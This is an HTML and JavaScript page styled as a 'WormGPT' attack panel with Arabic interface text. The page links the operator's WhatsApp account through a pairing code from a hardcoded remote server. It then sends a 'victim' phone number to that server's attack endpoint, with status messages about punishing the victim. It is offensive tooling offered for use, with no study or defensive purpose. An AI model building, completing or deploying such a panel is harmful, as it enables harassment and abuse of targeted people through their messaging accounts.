<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>WormGPT Console</title>
    <style>
        body { background: #000; color: #f00; font-family: monospace; text-align: center; padding: 40px; }
        .container { border: 2px solid #f00; padding: 20px; display: inline-block; background: #080808; }
        input { background: #111; color: #0f0; border: 1px solid #f00; padding: 10px; margin: 10px; width: 250px; }
        #pair-code { font-size: 32px; color: #fff; background: #222; padding: 10px; display: none; margin: 15px; border: 1px dashed #f00; }
        .hidden { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <h1>WORM-GPT ATTACK PANEL</h1>
        
        <div id="step1">
            <input type="text" id="phone" placeholder="رقمك (966...)">
            <button onclick="getCode()" style="padding:10px; cursor:pointer;">طلب كود الربط</button>
            <div id="pair-code"></div>
            <p id="msg">انتظر الكود واربطه في واتساب...</p>
        </div>

        <div id="step2" class="hidden">
            <h2 style="color:#0f0;">✔️ تم الارتباط بنجاح!</h2>
            <input type="text" id="target" placeholder="رقم الضحية للهجوم">
            <button onclick="startAttack()" style="padding:10px; background:#f00; color:#fff; font-weight:bold;">ابدأ الهجوم الشامل 🚀</button>
            <p id="attack-status"></p>
        </div>
    </div>

    <script>
        const API_URL = "http://51.75.118.79:20225"; 

        async function getCode() {
            const phone = document.getElementById('phone').value;
            const codeBox = document.getElementById('pair-code');
            codeBox.style.display = "block";
            codeBox.innerText = "جاري التحميل...";

            const res = await fetch(`${API_URL}/get-code?phone=${phone}`);
            const data = await res.json();
            codeBox.innerText = data.code;

            // ابدأ فحص حالة الربط كل 3 ثواني
            const check = setInterval(async () => {
                const statusRes = await fetch(`${API_URL}/check-status`);
                const statusData = await statusRes.json();
                if (statusData.connected) {
                    clearInterval(check);
                    document.getElementById('step1').classList.add('hidden');
                    document.getElementById('step2').classList.remove('hidden');
                }
            }, 3000);
        }

        async function startAttack() {
            const target = document.getElementById('target').value;
            document.getElementById('attack-status').innerText = "🔥 جاري جلد الضحية...";
            await fetch(`${API_URL}/attack?target=${target}`);
            document.getElementById('attack-status').innerText = "🚀 انتهى الهجوم!";
        }
    </script>
</body>
</html>
